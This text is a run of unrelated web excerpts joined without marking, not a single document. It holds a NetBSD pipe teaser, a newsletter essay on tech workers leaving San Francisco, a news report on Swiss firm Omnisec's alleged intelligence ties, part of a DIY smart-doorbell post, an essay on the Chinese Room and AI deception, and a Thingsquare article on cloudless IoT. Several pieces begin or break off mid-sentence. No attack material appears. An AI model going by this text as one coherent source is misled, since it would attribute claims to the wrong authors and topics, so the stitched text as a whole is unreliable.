<p>What are “big” pipes in NetBSD? They are special case pipes that exceed <code>PIPE_SIZE</code> …</p></div></div>

The networking event was open to the public, so tech strivers snaked around the block to get in. More than 1,000 people showed up. <a href="https://gigaom.com/2015/01/23/over-1000-people-showed-up-to-product-hunts-massive-happy-hour/">Reporters chronicled it</a>. I had a passphrase to say at the door to make sure I could get inside. Groupon Inc. co-founder <strong>Andrew Mason</strong> <a href="https://www.bloomberg.com/news/articles/2015-02-17/why-startups-want-this-28-year-old-to-really-like-them?sref=WS92jZg5">observed back then</a>, “I haven’t seen anything that captures the magic of the times we live in the way Product Hunt does.” That visceral feeling of mania over a buzzy San Francisco startup feels so distant now. </p><p>Hoover and I both left San Francisco last year, long before the pandemic. He moved to Los Angeles. I flew to my girlfriend in Brooklyn. Now, the lockdown has given everyone license to scatter. <em>The Wall Street Journal </em>reported that tech companies outside of Silicon Valley are seeing an <a href="https://www.wsj.com/articles/why-some-tech-workers-leaving-silicon-valley-are-changing-jobs-11606053600?mod=tech_lead_pos1">increase in job applicants</a>. <em><a href="https://www.theinformation.com/articles/tech-ceos-are-saying-goodbye-to-san-francisco">The Information</a></em><a href="https://www.theinformation.com/articles/tech-ceos-are-saying-goodbye-to-san-francisco"> reported</a> that Dropbox CEO <strong>Drew Houston</strong> and Splunk CEO <strong>Douglas Merritt</strong> have bought homes in Austin and plan to live there; Brex’s co-founders are in Los Angeles. <strong>Amy Sun</strong>, a promising venture capitalist who left Sequoia to build her own startup, <a href="https://techcrunch.com/2020/11/23/former-sequoia-partner-amy-sun-has-already-raised-millions-for-her-stealthy-startup/">is starting anew in Austin</a>. My tech friends are in Hawaii and wine country. We’ll see where they end up. The tech set has long threatened to abandon Silicon Valley. But this feels more credible. </p><p>We’re all in our own little worlds, looking at our own reflections in Zoom. What does it matter where we live? (And wouldn’t it be nicer if the taxes were lower?)</p><p>So, recently I turned to Hoover – because he’s always been emblematic of that startup hustle to me, even if he no longer embodies the zeitgeist like he once did. I hoped he might offer me some sense of place in a time when our existence is defined by the inside of our homes.</p><p><strong>“Where is Silicon Valley? It's all on the internet. It's been on the internet,”</strong> Hoover told me. </p><p>He’s right, of course. </p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F26549129-a065-4c5a-8dab-5a43c0d0b432_4256x2832.jpeg"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F26549129-a065-4c5a-8dab-5a43c0d0b432_4256x2832.jpeg" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/26549129-a065-4c5a-8dab-5a43c0d0b432_4256x2832.jpeg&quot;,&quot;height&quot;:969,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:2629945,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null}" alt=""></a></figure></div><p>Purists once restricted the phrase “Silicon Valley” to the places south of San Francisco, where they actually design silicon chips. The usage slipped to include San Francisco as the city became the nexus of all that was young and cool in the technology industry. Now, Silicon Valley is a <a href="https://www.nytimes.com/2020/10/13/books/review/what-tech-calls-thinking-adrian-daub.html">way of thinking</a>, coupled with a certain process for funding and valuing new companies. Somehow Oscar Health, a New York-based health insurance company, and SpaceX, a south of Los Angeles rocketship-manufacturer, both feel like Silicon Valley companies because they raised money from venture capital firms and because they would prefer to receive optimistic, growth-based valuations. Silicon Valley isn’t so much a place anymore. “It's on Twitter. It's on Product Hunt. It's on just different internet communities,” Hoover says. </p><p>Hoover marveled at the ease of investing in startups over video. He recounted a founder’s description of the new way of life: “It’s amazing, so much better. I don't have to bounce from café to office to café.” Hoover shared similar joy for the new order. “I’ve only met founders over video. I think I've only met a few portfolio-company founders in person ever,” he says. “That's just a much more efficient process. It forces investors to not be so constrained by location.”</p><p>It’s a sentiment I’ve heard from a fair number of people. Deals are certainly getting done faster than ever. There’s no excuse to drag out the process when we’re all just sitting around in our pajamas. (Some investors are more reluctant to make investments in strangers over Zoom, so they’re mostly sticking to deals with founders they already know.)</p><p><strong>To be honest, Hoover’s response bummed me out. </strong>I miss trekking from café to office to café, seeing the inside of people’s little worlds. On my last reporting trip to San Francisco before the end times, I bopped around San Francisco, hanging out inside one tech titan’s home and some random venture capital firm offices. I paced around South Park and the Embarcadero. </p><p>So much of Silicon Valley can seem totally made up. We obsess over valuations, but the numerical certainty starts to crumble if you so much as squint at them. What’s the preference stack? Could you really sell the stock at that price to anyone besides the Vision Fund? When will anyone be allowed to sell? </p><p>People sell fake ad inventory. People buy social media followers. So much of the technology news is an illusion. Elon Musk is the <a href="https://www.nbcnews.com/business/business-news/elon-musk-leapfrogs-over-bill-gates-become-second-richest-man-n1248791">second-richest man</a> in the world right now, allegedly. You really believe he’s richer than Bill Gates? Imagine if Musk started unloading Tesla shares.</p><p>Mapping things to the physical world countered the absurdity of it all. It might be crazy but at least the atoms existed. What was more Silicon Valley six years ago than a Product Hunt happy hour, or than a scooter zipping across Dropbox’s offices?</p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F82c03a8c-453d-44a3-babf-fd4560c7dfa1_5328x3552.jpeg"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F82c03a8c-453d-44a3-babf-fd4560c7dfa1_5328x3552.jpeg" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/82c03a8c-453d-44a3-babf-fd4560c7dfa1_5328x3552.jpeg&quot;,&quot;height&quot;:971,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:3561887,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null}" alt=""></a></figure></div><div><p>Even as the exodus is real, it is also already overhyped. “Here's the thing that I find super annoying,” says venture capitalist <strong>Ann Miura-Ko</strong>. </p><p><strong>“Everyone either thinks San Francisco is the center of the universe or it's dead,” Miura-Ko says. “It's just super annoying because anyone who has been here for over one cycle knows it always comes back and it always also falls out of favor.”</strong></p></div><p>In all honesty, San Francisco could lose a few thousand tech workers and still keep its grip on the industry. To the defectors, we welcome you to New York. And Austin could really make a run at being a verifiable tech hub. Go somewhere that feels like a vacation.</p><p>The disorientation is a reminder to pay attention to the people that make up Silicon Valley. If Silicon Valley is “on the internet,” as Hoover says, it’s more important than ever that we don’t lose sight of the people who make it tick. That’s one of my goals with this newsletter.

If you haven’t already, I’d love if you <a href="https://www.newcomer.co/subscribe">joined them</a>. </p><div><p>“If you go to see Silicon Valley, what you'll see are buildings. But it's the people that make it Silicon Valley, not the buildings,” <a href="http://www.paulgraham.com/siliconvalley.html">Paul Graham wrote</a> in a 2006 essay.</p><p>I’m going to do my best to bring everyone to Silicon Valley — no matter where we are. </p></div><p>Have a Happy Thanksgiving!</p></div></div>]]>

</div><p>Swiss public television, SRF, has found a second company besides Crypto AG&nbsp;was involved in manufacturing manipulated devices allegedly used for spying by foreign intelligence.</p>
<span>This content was published on November 26, 2020 - 11:34</span>
<time datetime="2020-11-26T11:34:28+01:00">

</time><p>According to <a rel="noopener" target="_blank" href="https://www.srf.ch/news/schweiz/verschluesselungsgeraete-geheimdienstaffaere-weitere-schweizer-firma-rueckt-in-den-fokus">SRF sources</a>, the Swiss company Omnisec AG had ties to US intelligence services. This follows revelations in February by SRF, German television ZDF and <em>The Washington Post</em> that Zug-based firm Crypto AG was at the heart of a huge international spying operation led by the CIA, and to a lesser extent by the German BND spy agency.&nbsp;Omnisec was one of the largest competitors of Crypto AG.</p><p>Swiss cryptologist and professor Ueli Maurer was a consultant for Omnisec for years and told SRF that in 1989 US intelligence services (National Security Agency) contacted Omnisec through him.</p><p>Of concern are the OC-500 series devices. Devices were sold to several Swiss federal agencies. However, Swiss&nbsp;authorities only noticed the devices weren't secure&nbsp;in the mid-2000s.</p><p>Several Swiss companies also received manipulated devices from Omnisec, including Switzerland’s largest bank, UBS. It is unclear whether the authorities informed UBS about the weak devices in the mid-2000s. UBS told SRF that it does not comment on security matters but that it had no indications that sensitive data were exposed at the time.</p>
<p>Omnisec, founded in 1987, manufactured voice, fax and data encryption equipment. It was dissolved a few years ago. The most recent head of the company, Clemens Kammer, told SRF that Omnisec customers “have and will continue to place great value on security, confidentiality, discretion and reliability in business relationships”.</p><p>Some politicians have called for further investigations into these latest allegations that may reveal who, if anyone, in the federal government knew of Omnisec’s business affairs with foreign intelligence.</p><h2>Crypto affair</h2><p>Earlier this month, a nine-month&nbsp;<a rel="noopener" target="_blank" href="https://web.archive.org/web/20201110183555/https:/www.parlament.ch/press-releases/Pages/mm-gpdel-2020-11-10.aspx">investigation</a>&nbsp;by the Swiss parliamentary audit committee (GPDel), found that the Swiss intelligence service knew that the US Central Intelligence Agency was behind the Swiss-based Crypto AG as far back as 1993. The report says that Swiss intelligence later collaborated with them to gather information from foreign sources.&nbsp;</p><p>More than 100 countries bought encryption devices from the Zug-based company, which did business under the guise of Swiss neutrality. In reality, the firm belonged to the CIA and Germany intelligence service, which could freely read what it encrypted. Information intercepted with the help of Crypto’s devices changed the course of events, including the Iran hostage crisis of 1979.</p> </section>

The whole project cost about $150 (USD), which is about average for a smart doorbell, but it is much more full-featured than anything else you’ll find on the market. For example, it integrates with the rest of the home security system — using machine learning to identify humans, cars, animals, and more:</p><figure><picture><source srcset="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" sizes="(max-width: 1024px) 100vw, 1024px" type="image/webp" data-srcset="https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2.jpg.webp 2048w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-300x300.jpg.webp 300w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-1024x1024.jpg.webp 1024w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-150x150.jpg.webp 150w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-768x768.jpg.webp 768w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-1536x1536.jpg.webp 1536w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-214x214.jpg.webp 214w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-540x540.jpg.webp 540w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-344x344.jpg.webp 344w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-442x442.jpg.webp 442w"><img src="https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2.jpg" alt="DIY smart doorbell detects a guest visitor with AI computer vision" width="1024" height="1024" title="Detecting a person approaching" srcset="https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2.jpg 2048w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-300x300.jpg 300w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-1024x1024.jpg 1024w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-150x150.jpg 150w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-768x768.jpg 768w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-1536x1536.jpg 1536w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-214x214.jpg 214w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-540x540.jpg 540w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-344x344.jpg 344w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-442x442.jpg 442w" sizes="(max-width: 1024px) 100vw, 1024px" data-eio="l" data-src="https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2.jpg" data-old-src="https://assets.technicallywizardry.com/wp-content/ewww/lazy/placeholder-1024x1024.png" data-srcset="https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2.jpg 2048w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-300x300.jpg 300w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-1024x1024.jpg 1024w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-150x150.jpg 150w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-768x768.jpg 768w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-1536x1536.jpg 1536w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-214x214.jpg 214w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-540x540.jpg 540w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-344x344.jpg 344w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-442x442.jpg 442w"></picture><figcaption>The smart doorbell uses TensorFlow to detect people, cars, animals, and more.</figcaption></figure><p>But I’m getting ahead of myself.</p><h2><span id="Designing_the_Smart_Doorbell"></span>Designing the Smart Doorbell<span></span></h2><p>Doorbells live outside.</p><p>Okay, that’s obvious. But it was my first electronic project that needed to <em>survive the elements</em>. To that end, I decided to use a <strong>junction box</strong> to house the electronics themselves.</p><p>The next requirement was also obvious: a <strong>button</strong>. However, the concern with such a unique design is that visitors need to intuitively understand <em>what the device is</em>. I decided upon a durable metal button that also lights up.

This is arguably the most important security camera in the entire house, and I didn’t have a lot of space in the junction box, so I splurged on a <strong>night-vision IR camera</strong> with a microphone built-in.

It also can detect which user pin code was used to open the door (and when) — great peace of mind when giving cleaners a code to the house.</p><figure><picture><source srcset="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" sizes="(max-width: 947px) 100vw, 947px" type="image/webp" data-srcset="https://content.technicallywizardry.com/2020/05/17160019/Screen-Shot-2020-05-17-at-9.59.28-AM.png.webp 1262w, https://content.technicallywizardry.com/2020/05/17160019/Screen-Shot-2020-05-17-at-9.59.28-AM-300x227.png.webp 300w, https://content.technicallywizardry.com/2020/05/17160019/Screen-Shot-2020-05-17-at-9.59.28-AM-1024x776.png.webp 1024w, https://content.technicallywizardry.com/2020/05/17160019/Screen-Shot-2020-05-17-at-9.59.28-AM-768x582.png.webp 768w"><img src="https://content.technicallywizardry.com/2020/05/17160019/Screen-Shot-2020-05-17-at-9.59.28-AM.png" alt="home assistant motioneye camera" width="947" height="717" title="Home Assistant " srcset="https://content.technicallywizardry.com/2020/05/17160019/Screen-Shot-2020-05-17-at-9.59.28-AM.png 1262w, https://content.technicallywizardry.com/2020/05/17160019/Screen-Shot-2020-05-17-at-9.59.28-AM-300x227.png 300w, https://content.technicallywizardry.com/2020/05/17160019/Screen-Shot-2020-05-17-at-9.59.28-AM-1024x776.png 1024w, https://content.technicallywizardry.com/2020/05/17160019/Screen-Shot-2020-05-17-at-9.59.28-AM-768x582.png 768w" sizes="(max-width: 947px) 100vw, 947px" data-eio="l" data-src="https://content.technicallywizardry.com/2020/05/17160019/Screen-Shot-2020-05-17-at-9.59.28-AM.png" data-old-src="https://assets.technicallywizardry.com/wp-content/ewww/lazy/placeholder-947x717.png" data-srcset="https://content.technicallywizardry.com/2020/05/17160019/Screen-Shot-2020-05-17-at-9.59.28-AM.png 1262w, https://content.technicallywizardry.com/2020/05/17160019/Screen-Shot-2020-05-17-at-9.59.28-AM-300x227.png 300w, https://content.technicallywizardry.com/2020/05/17160019/Screen-Shot-2020-05-17-at-9.59.28-AM-1024x776.png 1024w, https://content.technicallywizardry.com/2020/05/17160019/Screen-Shot-2020-05-17-at-9.59.28-AM-768x582.png 768w"></picture><figcaption>Home Assistant connects to MotionEye to show the camera, motion alerts, and other detections.</figcaption></figure><p>But, most importantly, it can be locked/unlocked with a tap in Home Assistant.</p><h2><span id="Source_Code_Recap"></span>Source Code: Recap<span></span></h2><p>I wish I could give you copy-and-paste code for this project, but a lot of it will depend on your exact hardware, speakers, cameras, etc. Instead, I’ll recap each piece involved and link to the articles/code where I explain how to implement them:</p><ul><li><a href="https://www.technicallywizardry.com/node-red-docker-kubernetes/" data-wpel-link="internal" rel="internal follow noopener noreferrer">Node Red uses gpiod</a> to trigger a flow when GPIO #18 (the doorbell button) fires.</li><li>The <a href="https://www.technicallywizardry.com/loudspeaker-network-intercoms-alerts/" data-wpel-link="internal" rel="internal follow noopener noreferrer">loudspeaker alert flow plays a wav file</a>.</li><li>I have <a href="https://www.technicallywizardry.com/speaker-multi-room-wireless-receiver/" data-wpel-link="internal" rel="internal follow noopener noreferrer">multiple DIY speakers</a> that play the alert around the house.</li><li><a href="https://www.technicallywizardry.com/diy-dashcam-raspberry-pi-zero-w-motion-eye/" data-wpel-link="internal" rel="internal follow noopener noreferrer">MotionEye drives the camera</a>, capturing stills and videos.</li><li>The <a href="https://www.technicallywizardry.com/iot/cctv-security-cameras/" data-wpel-link="internal" rel="internal follow noopener noreferrer">CCTV Security Cameras</a> handle person/object detection.</li><li><a href="https://www.technicallywizardry.com/tag/home-assistant/" data-wpel-link="internal" rel="internal follow noopener noreferrer">Home Assistant’s</a> Yale Lock integration allows us to lock/unlock.

<h2>Computer Software as Mind</h2>



<p>When I began programming computers, I believed that the processes of the human mind were equivalent to those of our computer programs: this idea is still popular among those in mathematics and technical fields, and professed directly in the field called “Cognitive Science.” Artificial Intelligence, according to this view, is the creation of minds in silicon.</p>



<p>One of the first computer programs I encountered was <em><a href="https://en.wikipedia.org/wiki/ELIZA">Eliza</a></em>, which, on the computer terminal, emulates a psychologist. At that time I believed that when a computer answers the question “who are you?” with “you are the one we are discussing,” she is actually making a claim, just like a real therapist. I had no reason to think that she was anything else but an artificial intelligence, a mind like ours, running on a microchip.</p>



<p>But as I continued to write code, I came to a realization: when I, as a programmer, take an input string, such as “How are you?” and create an output string, such as Eliza’s “This conversation is very demanding for you, isn’t it?” I am not actually creating a new thinking machine. Rather, I am writing a series of conditional commands, a row of if-else or switch statements, which determine, absolutely, what the interlocutor says. Still, it took me a long time to completely lose the belief that computers are artificial minds. My mathematics and computer science teachers, and my fellow students, fostered this belief: the relatively new field called “Cognitive Sciences” seems to be based on it, so it must be true, right?</p>



<p>And then there is the famous Turing Test: if a human can’t distinguish between interaction with a machine and interaction with a human, then the machine must have a mind, right? </p>



<p>There is another possibility: if a human can’t tell whether he’s interacting with computer software, or a human, he’s being duped. Thinking that he’s interacting with a mind like his–a feeling, experiencing subject–he will treat the computer as such, and will be manipulated to act in the interest of the robot’s owner. The artificial minds created by better and better software development techniques–running on exponentially faster computer processors–mark new heights in the art of deception.  </p>



<h2>A Patient in John Searle’s Chinese Room</h2>



<p><em>John Searle, I don’t know whether the allegations that you committed sexual mischief are true, or how grievous the transgressions may have been. Whatever wrongdoing you have committed, we still recognize the good deeds you have done. Your contributions to philosophy have touched my intellectual life: the predominance of the view of compatibilism in analytic philosophy–the idea that free will and determinism can coexist–seems like a cancer of doublethink to me, and you set me straight. Then, by studying your Chinese Room Argument, I overcame the youthful folly of believing that computers are minds….</em></p>



<p><a href="https://plato.stanford.edu/entries/chinese-room/">The Chinese Room Thought Experiment and related argument</a> must be one of the clearest, simplest, most conclusive moments in philosophy.Here’s an explanation of it. </p>



<p>The argument relies on a comparison, so we have to imagine two things at once. </p>



<p>First, think of an imaginary chatbot which speaks fluent Chinese, and can’t be distinguished from a human, so that it passes the Turing Test. Now, let’s imagine the actual Chinese Room: it’s a kind of a room with a mail-slot in it, and a lonely worker, with a massive list of instructions, maybe a flowchart. The worker doesn’t speak a word of Chinese. When a message is inserted into the slot, the worker looks at the signs written on it, then consults his instructions. The instructions contain a bunch of rules based on which characters appear on the message. The rules are applied to formulate a new message as a response. The functionary writes down the new Chinese characters by following his instructions. He doesn’t understand the symbols at all. When he’s done, he ejects the answer through the slot.</p>



<p>The metaphor is pretty simple to follow, if you know something about computer programming. The man outside the room is the user of the software. The instructions are source code. The functionary inside the room is the (very slow) computer. </p>



<p>Now, to the point: who, in this scenario, actually knows Chinese? The man outside the slot certainly knows Chinese. He’s using the service because that’s his native language. Also, the team of scholars who wrote the instructions–the software developers–might know Chinese. But the functionary does not. A computer manipulates symbols. It takes input from a user and generates output based on control structures. It passes the Turing Test, but doesn’t have a mind at all. It blindly manipulates bits which have no meaning to it. It may say “I love you”–or make any other claim of feeling or emotion–but this is pure deception. There is no “I” there, no subject.   </p>



<p>No matter how complex our programs become–and whether they are created through traditional software engineering by experts in their domains, or by new techniques such as machine learning–computers are only simulations of minds, and simulations must never be confused for what they simulate. They blindly manipulate symbols; humans–maybe animals, but that’s a different debate–are the only  ones who understand these symbols.</p>



<p>Learning about the Chinese Room, I visualize my visit there as a stay in a hospital, and Searle a medical doctor. He cures me of the chronic illusion that computers are minds. There is, as of yet, no program to implement a cure for the general population, and how can there be one? For we need to attain some knowledge of computer programming and a little philosophy, before we can be cured. And many of us would rather live the illusion. More on this, at the end of the article.</p>



<h2>Android Pinocchios and Discrimination</h2>



<p>The popular narratives of AI all seem to follow a similar form. If there are exceptions, I’d certainly like to discover them. The form goes something like this: at one point, artificial minds emerge. Our dizzyingly swift technological progress means that nobody is surprised. Robots follow their own interests, have desires, feel pain. Humans may fall in love with them, as in the 2013 movie <a href="https://en.wikipedia.org/wiki/Her_(film)">Her</a>, and humans may commit great harm to them, torturing them, as seen in Stephen Spielberg’s visually fantastic AI. Both of these films are worth watching. And Spielberg <em>does </em>portray the problem of the deceptive quality of AI, a world in which it’s not clear what is human (or animal), and what is robot. But the emergence of mind from machine is not the real-life narrative we are living now. Searle’s Chinese Room argument proves it! So why is this (false) narrative so pervasive?</p>



<p>There are a few reasons our writers may tell stories about the creation of artificial minds. They stem from a long literary tradition of such creations, from the myth of Pygmalion (told in Ovid’s <em>Metamorphoses</em>), <em>Frankenstein</em>, and <em>The Adventures of Pinocchio</em>, among many others. These stories satisfy our fascination with magic, whether we believe in magic or not. </p>



<p>And with every new advancement in computing and robotics, the claim which equates <em>magic </em>with <em>technology </em>becomes more viable: Moore’s Law’s doubling of processor power every eighteen months–exponential improvement–astounds the mind; We will soon have self driving cars on our roads. Bits of Arabic can be translated by machine into English, with outstanding results while, a few years back, the translators made many basic mistakes. We have detailed interactive maps of almost all of the Earth–spatial, though not temporal, crystal balls. And our social networks and websites know if we have a bald head, a missing tooth, wrinkles–and advertise plastic surgery to correct such flaws, even, I believe, when we have never researched these themes. We give speech-recognition robots orders and ask them questions, vocally. If we can do all of these things, can’t we create artificial minds?  (Answer: maybe we can, but our current trajectory of increasing processing speed won’t let us escape the Chinese Room.)</p>



<p>Another aspect of narratives of artificial minds relates to the narratives of our histories. Many of our most horrible acts have been caused by seeing The Other–in any of its forms–as a thing, an object rather than a subject. This has been the case in slavery, misogyny, antisemitism, racism, homophobia, and so on. The atrocity which haunts our imaginations most in the West–the genocide that occurred in the heart of the “civilized world”–was only possible because the Jews were seen as subhuman, or even “subanimal.” It is important that we take care to avoid such deception, the cognitive imaging of a thinking, feeling being as unthinking and unfeeling. We may include now the suffering of animals, the hardship of being a product in industrialized farming.</p>



<p> And in this quest to avoid treating new groups as objects, we see ethical value in narratives about cruelty to androids. For, if androids are subjects, but are different from us biologically, we risk the fear of mistreating them. The torture spectacle scene in Spielberg’s AI proffers this didactic warning, and we ought to heed it <em>if</em> we truly do create artificial minds.</p>



<h2>Dystopian Vertigo: Handsome Zombies Win our Hearts</h2>



<p>The narratives of the emergence of artificial minds are opposed to our real narrative of technological progress in computer software and hardware and robotics. There is no evidence that we will actually succeed in creating an artificial mind–and plenty of evidence that we will not do so by developing increasingly complex software.</p>



<p>As our bots become more convincing, they deceive us more fully.  The looming problem is not lack of empathy for robots, it’s misguided empathy– empathy which has no sentient target because its target is just a mindless computer program carefully engineered to mimic human emotion. Rather than encouraging empathy for the non-biological–as in Spielberg–we need to discourage …</p></div></div></article></div></div>

<p>We are not alone in believing in the idea of a cloudless IoT. In the IoT community, the concept is often called <a href="https://en.wikipedia.org/wiki/Edge_computing" target="_blank">edge</a> or <a href="https://en.wikipedia.org/wiki/Fog_computing" target="_blank">fog</a> computing. There are entire software platforms, such as the <a href="https://litmusautomation.com/en/loopedge/" target="_blank">Litmus LoopEdge platform</a>, <a href="https://azure.microsoft.com/en-us/services/iot-edge/" target="_blank">Microsoft Azure Edge</a>, and the <a href="https://crosser.io/solutions/iot-edge-analytics/" target="_blank">Crosser IoT edge analytics suite</a>, that are built to run off the grid. There are even custom <a href="https://cloud.google.com/edge-tpu/" target="_blank">hardware chips</a> designed to support off-the-cloud computation, usually speech&nbsp;processing.</p>
<p>There also an old adage that <i>the Internet of things without the Internet is just … things</i>. This is not true: there are many situations where IoT systems without Internet can be as valuable as Internet-enabled IoT&nbsp;systems.</p>
<p>We at Thingsquare have built and deployed several cloudless IoT systems with the no-cloud version of our IoT platform,&nbsp;including:</p>
<ul>

Sometimes it is not practical, or desirable, to rely on an external cloud service to operate your IoT system

<h2 id="why-iot-in-the-cloud-">Why IoT in the&nbsp;cloud?</h2>
<p>There are good reasons for why the backend logic of an IoT system is run in the&nbsp;cloud:</p>
<ul>
<li><strong>Data storage</strong>: The cloud can store an almost unlimited amount of&nbsp;data.</li>
<li><strong>Computation</strong>: Some mechanisms needs an abundance of computational power, which is something that the cloud can provide an almost unlimited amount&nbsp;of.</li>
<li><strong>Remote access</strong>: To provide users with remote access to the data generated by the IoT devices, or to control the devices themselves, you need to have a cloud service that connects the devices with their&nbsp;users.</li>
<li><strong>Access control</strong>: The cloud can provide effective access control mechanisms for your&nbsp;users.</li>
<li><strong>Data cross-referencing</strong>: To be able to run effective machine learning algorithms, you sometimes need access to a wide range of data. The cloud lets you collect data from more than one site to cross-reference and combine this&nbsp;data.</li>
<li><strong>Application integration</strong>: IoT systems rarely run on their own. Integration with other software systems is much easier if the backend is located in a single place: the&nbsp;cloud.</li>
<li><strong>Security updates</strong>: when the IoT backend is run in the cloud, a dedicated security team can keep track of and apply security updates as&nbsp;needed.</li>
</ul>
<p>These reasons, which are good reasons, are why most IoT systems today are provided through the cloud. Thingsquare is no&nbsp;exception.</p>
<p>The backend portion of the <a href="https://www.thingsquare.com/iot-platform/">Thingsquare IoT platform</a> is originally designed to be run in the cloud. Sometimes the backend is running on a typical cloud provider like Amazon Web Services, and sometimes the backend is installed on a hosted machine, as a traditional on-premise software&nbsp;package.</p>
<p>But the running the IoT backend in cloud does come with some&nbsp;drawbacks.</p>
<h2 id="why-cloudless-iot-">Why cloudless&nbsp;IoT?</h2>
<p>There are good reasons to not rely on an always-on cloud connection for every IoT&nbsp;project:</p>
<ul>
<li><strong>Stability</strong>: cloud services may go down so avoiding the cloud may therefore increase&nbsp;stability.</li>
<li><strong>Persistence</strong>: cloud services may go away so avoiding the cloud may allow the IoT system to run for ever, without relying on the hosting company to&nbsp;persist.</li>
<li><strong>Data privacy</strong>: sometimes data should not leave the location where it is&nbsp;generated.</li>
<li><strong>Security</strong>: fewer network connections means fewer attack&nbsp;vectors.</li>
<li><strong>Necessity</strong>: sometimes there just isn’t Internet&nbsp;access.</li>
</ul>
<p>Any cloud-based software may become unreachable if the cloud goes down. This can happen even for <a href="https://www.cbronline.com/news/google-cloud-down" target="_blank">companies like Google</a>, who arguably has state-of-the-art cloud infrastructures and one of the best cloud teams in the world. Any IoT solution that wholly depends on the cloud will suffer an outage if the cloud goes&nbsp;down.</p>
<p>Because the cloud service is a living thing, it may die. This can happen if the company that runs the service goes away or if it simply decides that it is no longer economical to keep it running. There are several <a href="https://hackaday.com/2019/11/14/best-buys-iot-goes-dark-leaving-some-smart-products-dumbfounded/">real-world</a> <a href="https://www.theverge.com/2016/4/4/11362928/google-nest-revolv-shutdown-smart-home-products">examples</a> of&nbsp;this.</p>
